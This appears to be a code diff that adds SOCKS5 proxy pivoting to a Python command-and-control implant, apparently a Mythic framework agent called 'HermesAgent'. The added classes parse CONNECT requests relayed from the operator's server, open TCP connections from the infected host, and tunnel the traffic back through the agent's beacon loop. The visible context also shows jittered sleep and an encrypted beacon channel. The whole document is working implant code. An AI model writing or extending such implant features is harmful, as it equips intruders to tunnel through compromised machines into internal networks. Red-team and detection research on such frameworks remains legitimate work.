@@ -13,6 +13,10 @@ import subprocess
 import platform
 import socket
 import uuid as uuid_mod
+import threading
+import queue
+import struct
+import select
 from io import BytesIO
 
 # Config injected by builder (will be replaced)
@@ -147,6 +151,216 @@ def get_ips():
     return out
 
 
+# ---------------------------------------------------------------------------
+# SOCKS5 proxy support (Mythic socks protocol)
+# ---------------------------------------------------------------------------
+
+class _SocksConn:
+    """Manages a single SOCKS5 connection for a given Mythic server_id.
+
+    Mythic handles the SOCKS5 greeting with the client. The first data
+    received here is already the CONNECT request: VER(1)+CMD(1)+RSV(1)+ATYP(1)+addr+port(2).
+    """
+    _S_CONNECT = 0
+    _S_RELAY   = 1
+
+    def __init__(self, server_id, out_q):
+        self.server_id = server_id
+        self._out   = out_q
+        self._state = self._S_CONNECT
+        self._sock  = None
+        self._buf   = b""
+        self._alive = True
+        self._lock  = threading.Lock()
+
+    # --- public --------------------------------------------------------
+
+    def feed(self, data):
+        """Push bytes received from Mythic (originating from the SOCKS client)."""
+        self._buf += data
+        while self._buf and self._alive:
+            if self._state == self._S_CONNECT:
+                if not self._do_connect():
+                    break
+            else:  # RELAY
+                if self._sock:
+                    try:
+                        self._sock.sendall(self._buf)
+                        self._buf = b""
+                    except Exception:
+                        self.close()
+                break
+
+    def close(self, notify=True):
+        """Close TCP socket and optionally notify Mythic with exit=true."""
+        with self._lock:
+            if not self._alive:
+                return
+            self._alive = False
+        if self._sock:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+            self._sock = None
+        if notify:
+            self._out.put({"server_id": self.server_id, "data": "", "exit": True})
+
+    # --- SOCKS5 state machine ------------------------------------------
+
+    def _do_connect(self):
+        """Parse SOCKS5 CONNECT request, open TCP connection, reply to client."""
+        if len(self._buf) < 4:
+            return False
+        ver  = self._buf[0]
+        cmd  = self._buf[1]
+        atyp = self._buf[3]
+
+        if ver != 5:
+            self._put_raw(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
+            self.close(notify=False)
+            return False
+
+        if cmd != 1:  # Only CONNECT (0x01) supported
+            self._put_raw(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
+            self.close(notify=False)
+            return False
+
+        try:
+            if atyp == 1:  # IPv4
+                if len(self._buf) < 10:
+                    return False
+                host = socket.inet_ntoa(self._buf[4:8])
+                port = struct.unpack(">H", self._buf[8:10])[0]
+                self._buf = self._buf[10:]
+            elif atyp == 3:  # Domain name
+                if len(self._buf) < 5:
+                    return False
+                dlen = self._buf[4]
+                if len(self._buf) < 5 + dlen + 2:
+                    return False
+                host = self._buf[5:5 + dlen].decode("utf-8", errors="replace")
+                port = struct.unpack(">H", self._buf[5 + dlen:5 + dlen + 2])[0]
+                self._buf = self._buf[5 + dlen + 2:]
+            elif atyp == 4:  # IPv6
+                if len(self._buf) < 22:
+                    return False
+                host = socket.inet_ntop(socket.AF_INET6, self._buf[4:20])
+                port = struct.unpack(">H", self._buf[20:22])[0]
+                self._buf = self._buf[22:]
+            else:
+                self._put_raw(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
+                self.close(notify=False)
+                return False
+        except Exception:
+            self._put_raw(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
+            self.close(notify=False)
+            return False
+
+        try:
+            self._sock = socket.create_connection((host, port), timeout=10)
+            # Reply with actual bound address
+            local_ip, local_port = self._sock.getsockname()[:2]
+            reply = b"\x05\x00\x00\x01" + socket.inet_aton(local_ip) + struct.pack(">H", local_port)
+            self._put_raw(reply)
+            self._state = self._S_RELAY
+            t = threading.Thread(target=self._reader_loop, daemon=True)
+            t.start()
+            # Forward any bytes that arrived after the CONNECT header
+            if self._buf:
+                try:
+                    self._sock.sendall(self._buf)
+                    self._buf = b""
+                except Exception:
+                    self.close()
+        except Exception:
+            # Connection refused / timeout
+            self._put_raw(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
+            self.close(notify=False)
+        return True
+
+    def _reader_loop(self):
+        """Background thread: read from TCP socket and push data to Mythic."""
+        while self._alive and self._sock:
+            try:
+                r, _, e = select.select([self._sock], [], [self._sock], 2.0)
+                if e:
+                    self.close()
+                    break
+                if r:
+                    try:
+                        chunk = self._sock.recv(65535)
+                    except Exception:
+                        self.close()
+                        break
+                    if chunk:
+                        self._put_raw(chunk)
+                    else:
+                        self.close()
+                        break
+            except Exception:
+                self.close()
+                break
+
+    def _put_raw(self, data):
+        self._out.put({
+            "server_id": self.server_id,
+            "data": base64.b64encode(data).decode(),
+            "exit": False,
+        })
+
+
+class SocksManager:
+    """Multiplexes all SOCKS5 connections for the agent."""
+
+    def __init__(self):
+        self._conns = {}          # server_id -> _SocksConn
+        self._lock  = threading.Lock()
+        self._out   = queue.Queue()
+
+    def handle(self, pkt):
+        """Dispatch one socks packet received from Mythic."""
+        sid = pkt.get("server_id")
+        if sid is None:
+            return
+        raw      = base64.b64decode(pkt.get("data") or "")
+        is_exit  = pkt.get("exit", False)
+
+        if is_exit:
+            with self._lock:
+                conn = self._conns.pop(sid, None)
+            if conn:
+                conn.close(notify=False)
+            return
+
+        with self._lock:
+            if sid not in self._conns:
+                conn = _SocksConn(sid, self._out)
+                self._conns[sid] = conn
+            else:
+                conn = self._conns[sid]
+
+        conn.feed(raw)
+
+        # Prune dead connections
+        with self._lock:
+            dead = [s for s, c in self._conns.items() if not c._alive]
+            for s in dead:
+                self._conns.pop(s, None)
+
+    def drain(self):
+        """Return all queued outgoing socks packets (to be sent to Mythic)."""
+        pkts = []
+        while True:
+            try:
+                pkts.append(self._out.get_nowait())
+            except queue.Empty:
+                break
+        return pkts
+
+
+# ---------------------------------------------------------------------------
+
 class HermesAgent:
     def __init__(self):
         self.payload_uuid = CONFIG_UUID
@@ -161,6 +375,7 @@ class HermesAgent:
         self.aes_key = None
         self._cwd = get_cwd()
         self._running = True
+        self._socks = SocksManager()
 
     def _sleep_time(self):
         j = random.randint(0, min(self.jitter, 100)) / 100.0
@@ -289,6 +504,9 @@ class HermesAgent:
             "tasking_size": -1,
             "responses": responses,
         }
+        socks_out = self._socks.drain()
+        if socks_out:
+            msg["socks"] = socks_out
         body = json.dumps(msg, default=str).encode("utf-8")
         resp = self._send(body)
         if not resp:
@@ -782,6 +1000,16 @@ class HermesAgent:
                     except Exception as e:
                         out["user_output"] = str(e)
                         out["status"] = "error"
+            elif cmd == "socks":
+                action = self._get_param(params, "action", "")
+                port = self._get_param(params, "port", "7777")
+                if action == "start":
+                    out["user_output"] = f"SOCKS5 proxy started on port {port}"
+                elif action == "stop":
+                    out["user_output"] = f"SOCKS5 proxy stopped (port {port})"
+                else:
+                    out["user_output"] = "Usage: socks start|stop [port]"
+                    out["status"] = "error"
             else:
                 out["user_output"] = f"Unknown command: {cmd}"
                 out["status"] = "error"
@@ -817,6 +1045,8 @@ class HermesAgent:
                 resp = self.run_task(task)
                 if resp:
                     responses.append(resp)
+            for socks_pkt in (data.get("socks") or []):
+                self._socks.handle(socks_pkt)
             time.sleep(self._sleep_time())
 
 
